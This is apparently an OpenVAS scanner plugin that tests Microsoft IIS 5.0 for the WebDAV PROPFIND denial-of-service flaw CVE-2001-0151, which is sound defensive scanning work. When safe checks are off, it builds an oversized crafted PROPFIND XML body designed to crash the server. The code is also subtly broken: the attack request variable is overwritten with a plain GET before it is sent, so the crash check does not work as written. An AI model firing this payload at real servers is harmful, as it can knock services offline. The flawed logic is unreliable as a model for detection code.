# OpenVAS Vulnerability Test
# $Id: iis_propfind2.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: IIS 5.0 PROPFIND Vulnerability
#
# Authors:
# Georgi Guninski's perl script
# ported to NASL by John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2001 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to disable the remote IIS server
by making a variation of a specially formed PROPFIND request.
An attacker, exploiting this vulnerability, would be able
to render the web service useless.  If the server is 'business
critical', the impact could be high.";

tag_solution = "disable the WebDAV extensions, as well as the PROPFIND command
See 
http://support.microsoft.com/support/kb/articles/Q241/5/20.AS";


if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.10667");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2453);
 script_cve_id("CVE-2001-0151");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 name = "IIS 5.0 PROPFIND Vulnerability";
 script_name(name);

 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");

 script_copyright("This script is Copyright (C) 2001 John Lampe");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("IIS/banner");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.microsoft.com/technet/security/bulletin/MS01-016.mspx");
 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

sig = get_http_banner(port:port);
if ( !sig || "IIS" >!< sig ) exit(0);

if(safe_checks())
{
   soc = http_open_socket(port);
   if(!soc)exit(0);
   
   req = string("PROPFIND / HTTP/1.0", "\r\n",
                "Host: ", get_host_name(), "\r\n\r\n");
   send(socket:soc, data:req);
   r = http_recv(socket:soc);
   
   if("411 Length Required" >< r)
   {
    if(egrep("Server:.*IIS.*", string:r))
    {
    alrt = "
The PROPFIND method is enabled on the remote IIS server.
On unpatched versions of IIS this allows anyone to
remotely shut this server down.  Microsoft included this
patch in Win2k Service Pack 2.

*** OpenVAS reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution: disable the WebDAV extensions, as well as the PROPFIND
command See 
http://support.microsoft.com/support/kb/articles/Q241/5/20.ASP
also:
http://www.microsoft.com/technet/security/bulletin/MS01-016.mspx";

     security_message(port:port, data:alrt);
    }
   }  
  exit(0);
}


mylen = 59060;
quote = raw_string(0x22);
xml = string ("<?xml version=",
      quote ,
      "1.0",
      quote,
      "?><a:propfind xmlns:a=",
      quote,
      "DAV:",
      quote,
      " xmlns:u=",
      quote,
      crap(length:mylen, data:":"),
      ":", 
      quote,
      ">",
      "<a:prop><a:displayname /><u:",
      "AAAA", 
      crap(length:mylen, data:":"),
      crap(length:64, data:"A"),
      " /></a:prop></a:propfind>\r\n\r\n");

l = strlen(xml);
req = string ("PROPFIND / HTTP/1.1\r\n", 
"Content-type: text/xml\r\n", 
"Host: ", get_host_name() , "\r\n", 
"Content-length: ", l, "\r\n\r\n", xml, "\r\n\r\n\r\n");


soc = http_open_socket(port);
if(!soc)exit(0);
else {
	req = http_get(item:"/", port:port);
	send(socket:soc, data:req);
	r = http_recv(socket:soc);
	http_close_socket(soc);
	if(!r)exit(0);
	}

soc2 = http_open_socket(port);
if(soc2)
{
 send(socket:soc2, data:req);
 r = http_recv(socket:soc2);
 http_close_socket(soc2);
}
else {
	exit(0);
     }

sleep(1);
soc3 = http_open_socket(port);
if(soc3)
{
req = http_get(item:"/", port:port);
send(socket:soc3, data:req);
r = http_recv(socket:soc3);
http_close_socket(soc3);
if(!r){
       security_message(port);
     }
else {
	if("HTTP/1.1 500 Server Error" >< r)security_message(port);
     }
}
else 
{
 security_message(port);
}
